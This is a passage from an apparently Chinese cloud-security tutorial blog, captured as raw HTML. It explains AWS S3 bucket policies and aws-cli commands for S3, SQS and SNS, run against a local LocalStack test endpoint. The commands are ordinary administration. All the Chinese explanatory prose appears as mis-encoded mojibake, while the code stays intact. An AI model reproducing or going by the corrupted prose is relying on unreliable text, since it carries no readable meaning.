string">"s3:ListBucketMultipartUploads"</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token property">"Resource"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token string">"arn:aws:s3:::bucket-name"</span><span class="token punctuation">,</span>                      <span class="token comment">// bucket æœ¬èº«</span>        <span class="token string">"arn:aws:s3:::bucket-name/*"</span>                    <span class="token comment">// bucket ä¸‹æ‰€æœ‰å¯¹è±¡</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token property">"Condition"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                                    <span class="token comment">// å¯é€‰å­—æ®µ</span>        <span class="token property">"StringEquals"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"s3:x-amz-server-side-encryption"</span><span class="token operator">:</span><span class="token string">"AES256"</span> <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    ...                                            <span class="token comment">// ä¹Ÿå¯ä»¥æ·»åŠ  Deny è¯­å¥æˆ–å¤šæ¡ Allow</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å­—æ®µ</th><th>ä½œç”¨</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>Version</code></td><td>ç­–ç•¥è¯­æ³•ç‰ˆæœ¬</td><td>å›ºå®šä¸º <code>2012-10-17</code></td></tr><tr><td><code>Statement</code></td><td>æƒé™å£°æ˜åˆ—è¡¨</td><td>è‡³å°‘ä¸€æ¡</td></tr><tr><td><code>Sid</code></td><td>è¯­å¥ ID</td><td>å¯é€‰ï¼Œä¸»è¦ç”¨äºæ—¥å¿—è·Ÿè¸ª&#x2F;æ’æŸ¥</td></tr><tr><td><code>Effect</code></td><td>ç»“æœ</td><td><code>Allow</code> æˆ– <code>Deny</code></td></tr><tr><td><code>Principal</code></td><td>ä¸»ä½“</td><td><code>AWS</code>ã€<code>Federated</code>ã€<code>Service</code>ï¼Œæˆ– <code>&quot;*&quot;</code>ï¼ˆæ‰€æœ‰äººï¼‰</td></tr><tr><td><code>Action</code></td><td>å¯æ‰§è¡Œæ¥å£</td><td><code>s3:*</code>ï¼ˆå…¨éƒ¨ï¼‰æˆ–ç»†ç²’åº¦å¦‚ <code>s3:GetObject</code> ç­‰</td></tr><tr><td><code>Resource</code></td><td>èµ„æº ARN</td><td>Bucket æˆ–å¯¹è±¡èŒƒå›´</td></tr><tr><td><code>Condition</code></td><td>è¿›ä¸€æ­¥é™åˆ¶</td><td>åŸºäº IPã€æ—¶é—´ã€åŠ å¯†æ–¹å¼ç­‰</td></tr></tbody></table><hr><h3 id="aws-cli-æ“ä½œ"><a href="#aws-cli-æ“ä½œ" class="headerlink" title="aws-cli æ“ä½œ"></a>aws-cli æ“ä½œ</h3><p><a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli_s3_code_examples.html">https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli_s3_code_examples.html</a></p><p>éƒ¨åˆ†æ“ä½œ s3 å’Œ s3api éƒ½æœ‰å¯¹åº”çš„å‘½ä»¤</p><h4 id="åˆ›å»ºå­˜å‚¨æ¡¶"><a href="#åˆ›å»ºå­˜å‚¨æ¡¶" class="headerlink" title="åˆ›å»ºå­˜å‚¨æ¡¶"></a>åˆ›å»ºå­˜å‚¨æ¡¶</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3 mb s3://amzn-s3-demo-bucket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3api create-bucket <span class="token punctuation">\</span>    <span class="token parameter variable">--bucket</span> amzn-s3-demo-bucket <span class="token punctuation">\</span>    <span class="token parameter variable">--region</span> us-east-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250829144508356.png"></p><h4 id="s3api-å­˜å‚¨æ¡¶ç­–ç•¥æ“ä½œ"><a href="#s3api-å­˜å‚¨æ¡¶ç­–ç•¥æ“ä½œ" class="headerlink" title="s3api å­˜å‚¨æ¡¶ç­–ç•¥æ“ä½œ"></a>s3api å­˜å‚¨æ¡¶ç­–ç•¥æ“ä½œ</h4><p>å†™å…¥å­˜å‚¨æ¡¶ç­–ç•¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3api put-bucket-policy <span class="token parameter variable">--bucket</span> amzn-s3-demo-bucket <span class="token parameter variable">--policy</span> file://policy.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>policy.jsonï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>   <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>         <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>         <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>         <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span>         <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:s3:::amzn-s3-demo-bucket/*"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span>         <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Deny"</span><span class="token punctuation">,</span>         <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>         <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span>         <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:s3:::amzn-s3-demo-bucket/MySecretFolder/*"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span>         <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>         <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"AWS"</span><span class="token operator">:</span> <span class="token string">"arn:aws:iam::123456789012:root"</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>         <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token string">"s3:DeleteObject"</span><span class="token punctuation">,</span>            <span class="token string">"s3:PutObject"</span>         <span class="token punctuation">]</span><span class="token punctuation">,</span>         <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:s3:::amzn-s3-demo-bucket/*"</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯»å–å­˜å‚¨æ¡¶ç­–ç•¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3api get-bucket-policy <span class="token parameter variable">--bucket</span> amzn-s3-demo-bucket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250829145855902.png"></p><h4 id="å­˜å‚¨æ¡¶æ–‡ä»¶æ“ä½œ"><a href="#å­˜å‚¨æ¡¶æ–‡ä»¶æ“ä½œ" class="headerlink" title="å­˜å‚¨æ¡¶æ–‡ä»¶æ“ä½œ"></a>å­˜å‚¨æ¡¶æ–‡ä»¶æ“ä½œ</h4><p>å¤åˆ¶æœ¬åœ°æ–‡ä»¶åˆ° s3ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3 <span class="token function">cp</span> /tmp/test.txt s3://amzn-s3-demo-bucket/test2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250829144810414.png"></p><p>ç›´æ¥ç§»åŠ¨æ–‡ä»¶åˆ° s3ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3 <span class="token function">mv</span> test.txt s3://amzn-s3-demo-bucket/test2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ—å‡º s3 ä¸‹çš„å­˜å‚¨æ¡¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3 <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ—å‡ºå­˜å‚¨æ¡¶ä¸­çš„æ‰€æœ‰å‰ç¼€å’Œå¯¹è±¡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3 <span class="token function">ls</span> s3://amzn-s3-demo-bucket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ç”¨ <code>--recursive</code> å‚æ•°é€’å½’åˆ—å‡ºæ‰€æœ‰å¯¹è±¡</p><p>s3api ä¸‹çš„æ“ä½œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3api list-buckets <span class="token parameter variable">--query</span> <span class="token string">"Buckets[].Name"</span><span class="token comment"># ä¼šè·¨åŒºåŸŸåˆ—å‡ºæ‰€æœ‰å­˜å‚¨æ¡¶</span>aws s3api list-objects <span class="token parameter variable">--bucket</span> amzn-s3-demo-bucket <span class="token parameter variable">--query</span> <span class="token string">'Contents[].&#123;Key: Key, Size: Size&#125;'</span>aws s3api list-objects-v2 <span class="token parameter variable">--bucket</span> amzn-s3-demo-bucket<span class="token comment"># è¿™ä¸ªä¼šåˆ—å‡ºæ›´è¯¦ç»†çš„ä¿¡æ¯</span>aws s3api put-object <span class="token punctuation">\</span>    <span class="token parameter variable">--bucket</span> amzn-s3-demo-bucket <span class="token punctuation">\</span>    <span class="token parameter variable">--key</span> my-dir/MySampleImage.png <span class="token punctuation">\</span>    <span class="token parameter variable">--body</span> MySampleImage.png<span class="token comment"># ä¸Šä¼ æ–‡ä»¶</span>aws s3api get-object <span class="token parameter variable">--bucket</span> text-content <span class="token parameter variable">--key</span> dir/my_images.tar.bz2 my_images.tar.bz2<span class="token comment"># ä¸‹è½½æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥è®¿é—® <a href="http://localhost:4566/amzn-s3-demo-bucket/test2.txt">http://localhost:4566/amzn-s3-demo-bucket/test2.txt</a> å¯ä»¥è¯»å–åˆšæ‰ä¸Šä¼ çš„æ–‡ä»¶</p><hr><h3 id="webapi-æ£€ç´¢"><a href="#webapi-æ£€ç´¢" class="headerlink" title="webapi æ£€ç´¢"></a>webapi æ£€ç´¢</h3><p><a href="https://blog.csdn.net/iteye_18543/article/details/81576616">https://blog.csdn.net/iteye_18543/article/details/81576616</a></p><p>å››ä¸ªå‚æ•°ï¼šprefixã€delimiterã€MaxKeysã€Marker</p><hr><h2 id="SQS-æ¶ˆæ¯é˜Ÿåˆ—"><a href="#SQS-æ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="SQS æ¶ˆæ¯é˜Ÿåˆ—"></a>SQS æ¶ˆæ¯é˜Ÿåˆ—</h2><p>SQS (Simple Queue Service) å¯ä»¥ç”¨æ¥å¸®åŠ©ä¸åŒçš„åº”ç”¨ç¨‹åºä¹‹é—´è¿›è¡Œå¯é çš„æ¶ˆæ¯ä¼ é€’ï¼Œå®ƒå°±åƒæ˜¯ä¸€ä¸ªæ¶ˆæ¯ä¸­è½¬ç«™ï¼Œå¯ä»¥æŠŠæ¶ˆæ¯ä»ä¸€ä¸ªåœ°æ–¹å‘é€åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œç¡®ä¿æ¶ˆæ¯çš„å®‰å…¨é€è¾¾å’Œå¤„ç†ï¼Œè®©åº”ç”¨ç¨‹åºä¹‹é—´æ›´å¥½åœ°è¿›è¡Œé€šä¿¡å’Œåä½œã€‚</p><p>Queue URL çš„ä¸»è¦æ„æˆéƒ¨åˆ†æ˜¯ Account ID å’Œ Queue</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"Version"</span><span class="token operator">:</span><span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>                                   <span class="token comment">// å›ºå®š</span>  <span class="token property">"Statement"</span><span class="token operator">:</span><span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token property">"Sid"</span><span class="token operator">:</span><span class="token string">"å¯é€‰çš„è¯­å¥ ID"</span><span class="token punctuation">,</span>      <span class="token property">"Effect"</span><span class="token operator">:</span><span class="token string">"Allow"</span> | <span class="token string">"Deny"</span><span class="token punctuation">,</span>      <span class="token property">"Principal"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token comment">// è´¦æˆ·/è§’è‰²/æœåŠ¡/åŒ¿å</span>        <span class="token property">"AWS"</span><span class="token operator">:</span><span class="token string">"arn:aws:iam::&lt;ACCOUNT_ID>:role/&lt;RoleName>"</span>      <span class="token comment">// å•ä¸€ä¸»ä½“</span>        <span class="token comment">// ä¹Ÿå¯ä»¥æ˜¯åˆ—è¡¨æˆ– â€œ*â€ï¼ˆåŒ¿åï¼‰</span>        <span class="token comment">// è¿˜å¯ä»¥æ˜¯ &#123;"Service":"sqs.amazonaws.com"&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"Action"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token string">"sqs:SendMessage"</span><span class="token punctuation">,</span>        <span class="token string">"sqs:ReceiveMessage"</span><span class="token punctuation">,</span>        <span class="token string">"sqs:DeleteMessage"</span><span class="token punctuation">,</span>        <span class="token string">"sqs:GetQueueAttributes"</span><span class="token punctuation">,</span>        <span class="token string">"sqs:ChangeMessageVisibility"</span><span class="token punctuation">,</span>        ...                                    <span class="token comment">// æŒ‰éœ€</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token property">"Resource"</span><span class="token operator">:</span><span class="token string">"arn:aws:sqs:&lt;REGION>:&lt;ACCOUNT_ID>:&lt;QUEUE_NAME>"</span><span class="token punctuation">,</span>      <span class="token property">"Condition"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                                           <span class="token comment">// å¯é€‰</span>        <span class="token property">"StringEquals"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"aws:SourceAccount"</span><span class="token operator">:</span><span class="token string">"123456789012"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"IpAddress"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"aws:SourceIp"</span><span class="token operator">:</span><span class="token string">"203.0.113.0/24"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"ArnEquals"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"aws:SourceArn"</span><span class="token operator">:</span><span class="token string">"arn:aws:lambda:&lt;REGION>:&lt;ACCOUNT_ID>:function:&lt;NAME>"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"NumericGreaterThan"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"sqs:ApproximateNumberOfMessages"</span><span class="token operator">:</span> <span class="token string">"0"</span> <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>aws-cli api æ–‡æ¡£ï¼š<a href="https://docs.aws.amazon.com/cli/latest/reference/sqs/">https://docs.aws.amazon.com/cli/latest/reference/sqs/</a></p><p>webapi æ–‡æ¡£ï¼š</p><p><a href="https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/APIReference/API_SendMessage.html">https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/APIReference/API_SendMessage.html</a></p><p><a href="https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/APIReference/API_ReceiveMessage.html">https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/APIReference/API_ReceiveMessage.html</a></p><h3 id="åˆ›å»ºæ ‡å‡†é˜Ÿåˆ—"><a href="#åˆ›å»ºæ ‡å‡†é˜Ÿåˆ—" class="headerlink" title="åˆ›å»ºæ ‡å‡†é˜Ÿåˆ—"></a>åˆ›å»ºæ ‡å‡†é˜Ÿåˆ—</h3><p>docker å®¹å™¨å†…éœ€è¦æœ‰ lessï¼Œæ²¡æœ‰çš„è¯ <code>apt-get install less</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws --endpoint-url<span class="token operator">=</span>http://localhost:4566 sqs create-queue --queue-name test_DocAndEvents <span class="token parameter variable">--region</span> us-east-1aws --endpoint-url<span class="token operator">=</span>http://localhost:4566 sqs create-queue --queue-name test_BusinessLayer <span class="token parameter variable">--region</span> us-east-1aws --endpoint-url<span class="token operator">=</span>http://localhost:4566 sqs create-queue --queue-name test_DocProcessor <span class="token parameter variable">--region</span> us-east-1aws --endpoint-url<span class="token operator">=</span>http://localhost:4566 sqs create-queue --queue-name test_Notifications <span class="token parameter variable">--region</span> us-east-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250828153937511.png"></p><h3 id="åˆ—å‡ºé˜Ÿåˆ—"><a href="#åˆ—å‡ºé˜Ÿåˆ—" class="headerlink" title="åˆ—å‡ºé˜Ÿåˆ—"></a>åˆ—å‡ºé˜Ÿåˆ—</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws --endpoint-url<span class="token operator">=</span>http://sqs.us-east-1.localhost.localstack.cloud:4566 sqs list-queues<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250828154144951.png"></p><h3 id="å‘å¸ƒæ¶ˆæ¯"><a href="#å‘å¸ƒæ¶ˆæ¯" class="headerlink" title="å‘å¸ƒæ¶ˆæ¯"></a>å‘å¸ƒæ¶ˆæ¯</h3><p>æµ‹è¯• test_DocAndEvents é˜Ÿåˆ—æ˜¯å¦æ­£åœ¨è¿è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws --endpoint-url<span class="token operator">=</span>http://sqs.us-east-1.localhost.localstack.cloud:4566 sqs send-message --queue-url http://sqs.us-east-1.localhost.localstack.cloud:4566/000000000000/test_DocAndEvents --message-body <span class="token string">"hello world"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250828154339677.png"></p><h3 id="æ¥æ”¶æ¶ˆæ¯"><a href="#æ¥æ”¶æ¶ˆæ¯" class="headerlink" title="æ¥æ”¶æ¶ˆæ¯"></a>æ¥æ”¶æ¶ˆæ¯</h3><p>æµ‹è¯•æ˜¯å¦å¯ä»¥ä½¿ç”¨ test_DocAndEvents é˜Ÿåˆ—çš„æ¶ˆæ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws --endpoint-url<span class="token operator">=</span>http://sqs.us-east-1.localhost.localstack.cloud:4566 sqs receive-message --queue-url http://sqs.us-east-1.localhost.localstack.cloud:4566/000000000000/test_DocAndEvents<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250828154601162.png"></p><p>ä»…æ¥æ”¶æœ€å 10 æ¡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws --endpoint-url<span class="token operator">=</span>http://sqs.us-east-1.localhost.localstack.cloud:4566 sqs receive-message --queue-url http://sqs.us-east-1.localhost.localstack.cloud:4566/000000000000/test_DocAndEvents --max-number-of-messages <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åˆ é™¤æ¶ˆæ¯"><a href="#åˆ é™¤æ¶ˆæ¯" class="headerlink" title="åˆ é™¤æ¶ˆæ¯"></a>åˆ é™¤æ¶ˆæ¯</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sqs delete-message --queue-url http://sqs.us-east-1.localhost.localstack.cloud:4566/000000000000/test_DocAndEvents --receipt-handle YWEwODNkNTgtOTk1OS00M2E3LWE1ZjctZGZmOWRiY2E2MjRjIGFybjphd3M6c3FzOnVzLWVhc3QtMTowMDAwMDAwMDAwMDA6eGhpYml0X0RvY0FuZEV2ZW50cyA4MDdiODlkNi1mNDgxLTQ2ZDItOGJmZi1hZmRkY2MyZWJkZjcgMTcxMDk0NzE0Ni42NTkwMTEx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åˆ é™¤é˜Ÿåˆ—"><a href="#åˆ é™¤é˜Ÿåˆ—" class="headerlink" title="åˆ é™¤é˜Ÿåˆ—"></a>åˆ é™¤é˜Ÿåˆ—</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws --endpoint-url<span class="token operator">=</span>http://localhost:4566 sqs delete-queue --queue-url http://localhost:4566/000000000000/test_BusinessLayer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="SNS"><a href="#SNS" class="headerlink" title="SNS"></a>SNS</h2><p>SNSï¼ˆSimple Notification Serviceï¼‰å¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜å‘ç§»åŠ¨è®¾å¤‡ã€ç”µå­é‚®ä»¶ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰å¤šç§ç»ˆç«¯å‘é€é€šçŸ¥æ¶ˆæ¯ï¼Œè®©ä½ èƒ½å¤Ÿè½»æ¾åœ°å‘ç”¨æˆ·ä¼ é€’é‡è¦ä¿¡æ¯å’Œå®æ—¶æ›´æ–°ã€‚ç®€å•æ¥è¯´ï¼ŒSNS å°±åƒæ˜¯ä¸€ä¸ªæ¶ˆæ¯å¹¿æ’­ç³»ç»Ÿï¼Œè®©ä½ èƒ½å¤Ÿå¿«é€Ÿã€å¯é åœ°å°†æ¶ˆæ¯å‘é€ç»™è®¢é˜…è€…ï¼Œç¡®ä¿ä»–ä»¬åŠæ—¶æ”¶åˆ°ä½ å‘é€çš„é€šçŸ¥ã€‚</p><p>aws-cliï¼š<a href="https://docs.aws.amazon.com/cli/latest/reference/sns/#cli-aws-sns">https://docs.aws.amazon.com/cli/latest/reference/sns/#cli-aws-sns</a></p><table><thead><tr><th><strong>æ“ä½œ</strong></th><th><strong>å‘½ä»¤</strong></th><th><strong>è¯´æ˜</strong></th><th><strong>å¸¸ç”¨å‚æ•°</strong></th></tr></thead><tbody><tr><td>åˆ›å»ºä¸»é¢˜</td><td><code>aws sns create-topic --name MyTopic</code></td><td>è¿”å› TopicArn</td><td><code>--name</code></td></tr><tr><td>åˆ é™¤ä¸»é¢˜</td><td><code>aws sns delete-topic --topic-arn arn:aws:sns:REGION:ACCOUNT:MyTopic</code></td><td>ä¸èƒ½å†æ¬¡ä½¿ç”¨</td><td><code>--topic-arn</code></td></tr><tr><td>è®¢é˜…ä¸»é¢˜</td><td><code>aws sns subscribe --topic-arn arn:aws:sns:REGION:ACCOUNT:MyTopic --protocol email --notification-endpoint user@example.com</code></td><td>éœ€è¦ç¡®è®¤è®¢é˜…</td><td><code>--protocol</code>, <code>--notification-endpoint</code></td></tr><tr><td>å–æ¶ˆè®¢é˜…</td><td><code>aws sns unsubscribe --subscription-arn arn:aws:sns:REGION:ACCOUNT:MyTopic:3e4fb6b2-â€¦</code></td><td>ä¹‹åæ¥æ”¶ä¸åˆ°æ¶ˆæ¯</td><td><code>--subscription-arn</code></td></tr><tr><td>å‘å¸ƒæ¶ˆæ¯</td><td><code>aws sns publish --topic-arn arn:aws:sns:REGION:ACCOUNT:MyTopic --message &quot;Hello from CLI!&quot;</code></td><td>ä¹Ÿå¯å¸¦ MessageStructureã€Subject ç­‰</td><td><code>--message</code>, <code>--subject</code>, <code>--message-structure</code></td></tr><tr><td>åˆ—å‡ºä¸»é¢˜</td><td><code>aws sns list-topics</code></td><td>æ”¯æŒåˆ†é¡µï¼ˆ<code>--max-retries</code>ã€<code>--page-size</code>ï¼‰</td><td><code>--max-results</code></td></tr><tr><td>åˆ—å‡ºè®¢é˜…</td><td><code>aws sns list-subscriptions</code></td><td>åŒæ ·åˆ†é¡µ</td><td><code>--max-results</code></td></tr><tr><td>è·å–ä¸»é¢˜å±æ€§</td><td><code>aws sns get-topic-attribute --topic-arn arn:â€¦ --attribute-name DisplayName</code></td><td>å±æ€§å¯è¯»å†™</td><td><code>--attribute-name</code></td></tr><tr><td>è®¾ç½®ä¸»é¢˜å±æ€§</td><td><code>aws sns set-topic-attribute --topic-arn arn:â€¦ --attribute-name DisplayName --attribute-value NewName</code></td><td>æ›¿æ¢æˆ–æ–°å¢</td><td><code>--attribute-name</code>, <code>--attribute-value</code></td></tr><tr><td>åˆ é™¤ä¸»é¢˜å±æ€§</td><td><code>aws sns delete-topic-attribute --topic-arn arn:â€¦ --attribute-name DisplayName</code></td><td></td><td><code>--attribute-name</code></td></tr><tr><td><strong>å‘å¸ƒå¤šåª’ä½“ï¼ˆä½¿ç”¨ MessageStructure jsonï¼‰</strong></td><td><code>aws sns publish --topic-arn arn:... --message &#39;&#123;&quot;default&quot;:&quot;Hello&quot;, &quot;email&quot;:&quot;Hello via Email&quot;&#125;&#39; --message-structure json</code></td><td>å‘é€å¤šç§æ ¼å¼</td><td><code>--message-structure</code></td></tr><tr><td><strong>ä½¿ç”¨ AWSâ€‘CLI çš„ <code>--cli-input-json</code></strong></td><td><code>aws sns publish --cli-input-json file://payload.json</code></td><td>é€‚åˆé•¿ã€å¤æ‚çš„æ¶ˆæ¯</td><td>è§ below è¯´æ˜</td></tr><tr><td><strong>ç­‰å¾…ä¸»é¢˜åˆ é™¤å®Œæˆ</strong></td><td><code>aws wait sns-topic-deleted --topic-arn arn:â€¦</code></td><td>å½“ä½ æƒ³åŒæ­¥æµç¨‹</td><td><code>--topic-arn</code></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><p>åˆ›å»ºä¸»é¢˜ã€åˆ—å‡ºä¸»é¢˜</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sns create-topic <span class="token parameter variable">--name</span> MyTopicaws sns list-topics<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250829110309885.png"></p><p>è®¢é˜…ä¸»é¢˜ï¼Œå…¶ä¸­ <code>--notification-endpoint</code> å¯ä»¥æŒ‡å®šå¤šç§åè®®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:MyTopic <span class="token parameter variable">--protocol</span> email --notification-endpoint user@example.comaws sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:MyTopic <span class="token parameter variable">--protocol</span> http --notification-endpoint http://192.168.65.254:23333<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250829110319986.png"></p><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250829111428824.png"></p><p>http ç«¯æ”¶åˆ°çš„å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.65.254:23333</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Amazon Simple Notification Service Agent</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip,deflate</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span class="token header"><span class="token header-name 